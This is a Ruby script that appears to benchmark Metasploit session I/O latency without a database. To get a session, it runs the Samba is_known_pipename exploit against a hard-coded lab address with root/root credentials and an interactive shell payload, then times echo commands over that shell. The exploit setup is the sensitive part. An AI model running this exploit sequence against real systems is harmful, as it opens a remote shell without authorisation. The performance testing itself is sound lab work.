#!/usr/bin/env ruby
# frozen_string_literal: true

#
# Test shell_write performance without database.yml
#

require 'benchmark'

TARGET = '172.19.0.3'

puts "=" * 60
puts "TESTING SHELL_WRITE WITHOUT DATABASE"
puts "=" * 60

# Move database.yml
db_config = File.expand_path("~/.msf4/database.yml")
db_backup = db_config + ".backup"

had_config = false
if File.exist?(db_config)
  File.rename(db_config, db_backup)
  puts "Moved database.yml to backup"
  had_config = true
end

begin
  require 'msfenv'
  require 'msf/base'

  framework = Msf::Simple::Framework.create

  puts "\n=== Database status ==="
  puts "  db.active: #{framework.db.active}"

  # Create or reuse session
  if framework.sessions.length > 0
    session = framework.sessions.values.first
    puts "\n  Reusing existing session: #{session.sid}"
  else
    puts "\n  Creating new session..."
    exploit = framework.exploits.create('linux/samba/is_known_pipename')
    Msf::Simple::Framework.simplify_module(exploit)
    exploit.datastore['RHOSTS'] = TARGET
    exploit.datastore['SMB_SHARE_NAME'] = 'myshare'
    exploit.datastore['SMB_USER'] = 'root'
    exploit.datastore['SMB_PASS'] = 'root'
    exploit.datastore['PAYLOAD'] = 'cmd/unix/interact'
    exploit.datastore['TARGET'] = 0

    driver = Msf::ExploitDriver.new(framework)
    driver.exploit = exploit
    driver.payload = framework.payloads.create('cmd/unix/interact')
    driver.payload.share_datastore(exploit.datastore)
    driver.target_idx = 0
    exploit.init_ui(nil, Rex::Ui::Text::Output::Buffer.new)
    driver.payload.init_ui(nil, Rex::Ui::Text::Output::Buffer.new)

    session = driver.run
    unless session
      puts "  FAILED to create session"
      exit 1
    end
    puts "  Created session: #{session.sid}"
  end

  puts "\n=== Timing shell_write (NO DATABASE) ==="
  10.times do |i|
    time = Benchmark.realtime { session.shell_write("echo test#{i}\n") }
    puts "  shell_write ##{i+1}: #{(time * 1000).round(3)}ms"
  end

  sleep 0.2
  session.rstream.get_once(-1, 0.1) rescue nil  # Clear buffer

  puts "\n=== Timing on_session_command ==="
  10.times do |i|
    time = Benchmark.realtime do
      framework.events.on_session_command(session, "test#{i}")
    end
    puts "  on_session_command ##{i+1}: #{(time * 1000).round(3)}ms"
  end

  puts "\n=== Timing shell_command (timeout=0.5) ==="
  3.times do |i|
    time = Benchmark.realtime do
      result = session.shell_command("echo quick#{i}", 0.5)
    end
    puts "  shell_command ##{i+1}: #{(time * 1000).round(3)}ms"
  end

  puts "\nDone!"

ensure
  # Restore database.yml
  if had_config && File.exist?(db_backup)
    File.rename(db_backup, db_config)
    puts "\nRestored database.yml"
  end
end
